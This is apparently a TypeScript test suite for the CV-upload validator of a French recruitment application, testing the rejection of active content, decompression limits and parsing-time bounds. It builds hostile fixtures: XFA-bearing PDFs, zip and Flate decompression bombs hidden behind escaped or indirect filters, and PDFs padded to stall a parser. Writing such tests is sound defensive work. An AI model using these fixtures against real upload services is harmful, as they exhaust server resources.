    const withScript = saveIncrementally(libreOfficeCvPdf(), [
      { number: 20, body: "<</Type/Catalog/Pages 10 0 R/AcroForm<</Fields[]/XFA 22 0 R>>/NeedsRendering true>>" },
      { number: 22, body: `<</Length ${template.length}>>\nstream\n${template}\nendstream` },
    ]);
    expect(() => validate(withScript)).toThrow("cv_validation_pdf_active_content");
    expect(() => validate(packPdfIntoObjectStream(libreOfficeCvPdf(), { edit: xfa("/XFA 99 0 R") }))).toThrow("cv_validation_pdf_active_content");
    expect(() => validate(Buffer.from(xfa("/X#46A 99 0 R")(libreOfficeCvPdf().toString("latin1")), "latin1"))).toThrow("cv_validation_pdf_active_content");
    // A plain form (AcroForm without XFA) stays accepted.
    expect(validate(packPdfIntoObjectStream(libreOfficeCvPdf(), { edit: xfa("") })).pageCount).toBe(1);
    expect(recruitmentCvValidationMessage("cv_validation_pdf_active_content")).toContain("Réenregistrez votre CV en DOCX");
  });

  it("dit au candidat quoi faire d’un CV refusé : le réenregistrer en DOCX ou l’imprimer en PDF depuis le navigateur", () => {
    for (const code of ["cv_validation_pdf_active_content", "cv_validation_docx_active_content", "cv_validation_pdf_page_structure_invalid"]) {
      expect(recruitmentCvValidationMessage(code), code).toContain("Réenregistrez votre CV en DOCX ou imprimez-le en PDF depuis votre navigateur");
    }
    expect(recruitmentCvValidationMessage("cv_validation_pdf_active_content")).not.toContain("Enregistrez-le en PDF");
  });
});

describe("bombes de décompression : plafonds avant extraction", () => {
  it("refuse un DOCX de quelques Ko qui se décompresse au-delà de 20 Mo", () => {
    const bomb = buildDocx(["CV"], [{ name: "word/media/filler.bin", content: Buffer.alloc(DOCUMENT_DECOMPRESSION_LIMITS.docxMaxUncompressedBytes + 1024, 0) }]);
    expect(bomb.length).toBeLessThan(100 * 1024);
    expect(() => validateCvFile({ buffer: bomb, mimeType: DOCX, originalName: "cv.docx", size: bomb.length })).toThrow("cv_validation_docx_decompressed_size_exceeded");
    expect(recruitmentCvValidationMessage("cv_validation_docx_decompressed_size_exceeded")).toContain("trop volumineux");
  });

  it("refuse un PDF dont les flux compressés dépassent le plafond, mais pas ses images", () => {
    const flateBomb = pdfWithStream("/Filter /FlateDecode", deflateSync(Buffer.alloc(DOCUMENT_DECOMPRESSION_LIMITS.pdfMaxInflatedBytes + 1024, 32)));
    expect(flateBomb.length).toBeLessThan(200 * 1024);
    expect(() => validateCvFile({ buffer: flateBomb, mimeType: "application/pdf", originalName: "cv.pdf", size: flateBomb.length })).toThrow("cv_validation_pdf_decompressed_size_exceeded");

    const normal = pdfWithStream("/Filter /FlateDecode", deflateSync(Buffer.from("BT /F1 12 Tf (Dr Candidat) Tj ET")));
    expect(validateCvFile({ buffer: normal, mimeType: "application/pdf", originalName: "cv.pdf", size: normal.length }).pageCount).toBe(1);

    const hugeImage = pdfWithStream("/Type /XObject /Subtype /Image /Width 100000 /Height 100000 /Filter /FlateDecode", deflateSync(Buffer.alloc(10)));
    expect(() => validateCvFile({ buffer: hugeImage, mimeType: "application/pdf", originalName: "cv.pdf", size: hugeImage.length })).toThrow("cv_validation_pdf_image_too_large");
  });

  it("ne se fie pas au dictionnaire du flux : fin de ligne CR, filtre indirect ou échappé, faux en-tête d’image, compression imbriquée", () => {
    const over = Buffer.alloc(DOCUMENT_DECOMPRESSION_LIMITS.pdfMaxInflatedBytes + 1024, 32);
    const bomb = deflateSync(over);
    const shapes: Array<[string, Buffer]> = [
      ["CR seul après stream", pdfWithStream("/Filter /FlateDecode", bomb, "\r")],
      ["espaces puis CRLF après stream", pdfWithStream("/Filter /FlateDecode", bomb, "  \r\n")],
      ["filtre en référence indirecte", pdfWithStream("/Filter 9 0 R", bomb)],
      ["nom de filtre échappé", pdfWithStream("/Filter /F#6CateDecode", bomb)],
      ["contenu déguisé en petite image", pdfWithStream("/Subtype /Image /Width 10 /Height 10 /Filter /FlateDecode", bomb)],
      ["image aux dimensions indirectes", pdfWithStream("/Subtype /Image /Width 7 0 R /Height 8 0 R /Filter /FlateDecode", bomb)],
      ["Flate dans Flate", pdfWithStream("/Filter [/FlateDecode /FlateDecode]", deflateSync(bomb))],
    ];
    for (const [label, pdf] of shapes) {
      expect(() => validateCvFile({ buffer: pdf, mimeType: "application/pdf", originalName: "cv.pdf", size: pdf.length }), label).toThrow("cv_validation_pdf_decompressed_size_exceeded");
    }
    // Honest images are still accepted: a declared 1000×1000 RGB photo, and a large one.
    const photo = pdfWithStream("/Type /XObject /Subtype /Image /Width 1000 /Height 1000 /ColorSpace /DeviceRGB /BitsPerComponent 8 /Filter /FlateDecode", deflateSync(Buffer.alloc(3_000_000, 90)));
    expect(validateCvFile({ buffer: photo, mimeType: "application/pdf", originalName: "cv.pdf", size: photo.length }).pageCount).toBe(1);
    const scan = pdfWithStream("/Type /XObject /Subtype /Image /Width 2480 /Height 3508 /ColorSpace /DeviceRGB /BitsPerComponent 8 /Filter /FlateDecode", deflateSync(Buffer.alloc(2480 * 3508 * 3, 200)));
    expect(validateCvFile({ buffer: scan, mimeType: "application/pdf", originalName: "cv.pdf", size: scan.length }).pageCount).toBe(1);
    expect(recruitmentCvValidationMessage("cv_validation_pdf_processing_timeout")).toContain("trop volumineux");
  });

  it("borne aussi les images et les données corrompues, sans refuser un CV honnête", () => {
    const pdfWithStreams = (streams: Array<[string, Buffer]>) => Buffer.concat([
      Buffer.from("%PDF-1.7\n1 0 obj << /Type /Page >> endobj\n"),
      ...streams.flatMap(([dictionary, data], index) => [Buffer.from(`${index + 2} 0 obj << ${dictionary} /Length ${data.length} >>\nstream\n`, "latin1"), data, Buffer.from("\nendstream\nendobj\n")]),
      Buffer.from("%%EOF\n"),
    ]);
    const validate = (pdf: Buffer) => validateCvFile({ buffer: pdf, mimeType: "application/pdf", originalName: "cv.pdf", size: pdf.length });
    const photo: [string, Buffer] = ["/Type /XObject /Subtype /Image /Width 1000 /Height 1000 /ColorSpace /DeviceRGB /BitsPerComponent 8 /Filter /FlateDecode", deflateSync(Buffer.alloc(3_000_000, 90))];
    const text: [string, Buffer] = ["/Filter /FlateDecode", deflateSync(Buffer.from("BT /F1 12 Tf (Dr Candidat) Tj ET"))];
    // 150 MB of honest images: those past the probes' budget count like the other streams, under their cap.
    expect(validate(pdfWithStreams([...Array.from({ length: 50 }, () => photo), text])).pageCount).toBe(1);
    // zlib data followed by an invalid block: inflating it fails once `content` is out.
    const damaged = (content: Buffer): [string, Buffer] => ["/Filter /FlateDecode", Buffer.concat([deflateSync(content, { finishFlush: constants.Z_SYNC_FLUSH }), Buffer.from([0xff])])];
    // A damaged stream counts for what it inflated to before the error, not for the most its size allows
    // (40 KB that deflate cannot shrink, like a font, could have inflated to 40 MB): 30 MB still fit after it.
    const page = (bytes: number): [string, Buffer] => ["/Filter /FlateDecode", deflateSync(Buffer.alloc(bytes, 32))];
    expect(validate(pdfWithStreams([damaged(randomBytes(40_000)), page(30 * 1024 * 1024), text])).pageCount).toBe(1);
    // But it does count: 39 MB before the error leave too little for the next stream.
    expect(() => validate(pdfWithStreams([damaged(Buffer.alloc(39 * 1024 * 1024)), page(2 * 1024 * 1024)]))).toThrow("cv_validation_pdf_decompressed_size_exceeded");
  });

  it("juge un fichier de 4 Mo truffé de mots « stream » ou d’objets en un temps linéaire, pas quadratique", () => {
    // Before the reading of object streams was bounded, 800 KB of "stream\n" took 17 s.
    const filled = (unit: string) => Buffer.from(`%PDF-1.7\n${unit.repeat(Math.floor((4 * 1024 * 1024 - 16) / unit.length))}`, "latin1");
    const shapes: Array<[string, string]> = [
      ["stream\n", "cv_validation_pdf_stream_count_exceeded"],
      ["stream\nx\x9c", "cv_validation_pdf_stream_count_exceeded"],
      ["1 0 obj <</N 1/First 4/Filter/FlateDecode>>stream\nx\x9c", "cv_validation_pdf_stream_count_exceeded"],
      ["1 0 obj <<", "cv_validation_pdf_page_structure_invalid"],
      ["obj (", "cv_validation_pdf_page_structure_invalid"],
    ];
    for (const [unit, code] of shapes) {
      const pdf = filled(unit);
      const started = performance.now();
      expect(() => validateCvFile({ buffer: pdf, mimeType: "application/pdf", originalName: "cv.pdf", size: pdf.length }), JSON.stringify(unit)).toThrow(code);
      expect(performance.now() - started, JSON.stringify(unit)).toBeLessThan(4_000);
    }
    expect(recruitmentCvValidationMessage("cv_validation_pdf_stream_count_exceeded")).toContain("imprimez-le en PDF depuis votre navigateur");
  }, SEVERAL_HEAVY_READS_TIMEOUT_MS);

  it.each(pathologicalPdfs())("juge en moins de deux secondes un PDF de 4 Mo fait pour bloquer le serveur : $label", ({ pdf, outcome }) => {
    // 1 MB of "stream stream…" without an end of line blocked the server for 84 s; 4 MB, for more than 5 minutes.
    // Each is now judged in a quarter of a second at most; the margin is for a loaded CI.
    const started = performance.now();
    const validate = () => validateCvFile({ buffer: pdf, mimeType: "application/pdf", originalName: "cv.pdf", size: pdf.length });
    if (outcome === "accepted") expect(validate().pageCount).toBe(1);
    else expect(validate).toThrow(`cv_validation_pdf_${outcome}`);
    expect(performance.now() - started).toBeLessThan(2_000);
  });

  it("juge en moins de deux secondes un DOCX dont les relations se décompressent en 20 Mo de balises", () => {
    const docxWithRelationships = (unit: string) => buildDocx(["CV"], [{ name: "word/_rels/document.xml.rels", content: unit.repeat(Math.floor(19 * 1024 * 1024 / unit.length)) }]);
    // 200 KB of "<Relationship " took 3 s; a few KB of DOCX inflate to 20 MB.
    for (const [unit, code] of [["<Relationship ", "cv_validation_docx_container_invalid"], ["<Relationship Type=\"a\" ", "cv_validation_docx_container_invalid"], ["<Relationship/>", null]] as const) {
      const docx = docxWithRelationships(unit);
      expect(docx.length).toBeLessThan(100 * 1024);
      const started = performance.now();
      const validate = () => validateCvFile({ buffer: docx, mimeType: DOCX, originalName: "cv.docx", size: docx.length });
      if (code) expect(validate, unit).toThrow(code);
      else expect(validate().mimeType).toBe(DOCX);
      expect(performance.now() - started, unit).toBeLessThan(2_000);
    }
    expect(recruitmentCvValidationMessage("cv_validation_docx_container_invalid")).toContain("Réenregistrez votre CV en DOCX");
  }, SEVERAL_HEAVY_READS_TIMEOUT_MS);

  it("tronque le texte extrait à 200 000 caractères avec un avertissement", async () => {
    expect(truncateExtractedText("abc", 2)).toEqual({ text: "ab", truncated: true });
    const longDocx = buildDocx(Array.from({ length: 3_000 }, (_, index) => `Expérience ${index} : ${"anesthésie ".repeat(10)}`));
    const extraction = await extractCvDocument(longDocx, DOCX);
    expect(extraction.text.length).toBe(DOCUMENT_DECOMPRESSION_LIMITS.extractedTextMaxChars);
    expect(extraction.warnings).toContain("extracted_text_truncated");
    const shortDocx = buildDocx(["Dr Court", "IADE"]);
    const short = await extractCvDocument(shortDocx, DOCX);
    expect(short.text).toContain("Dr Court");
    expect(short.warnings).not.toContain("extracted_text_truncated");
  });
});
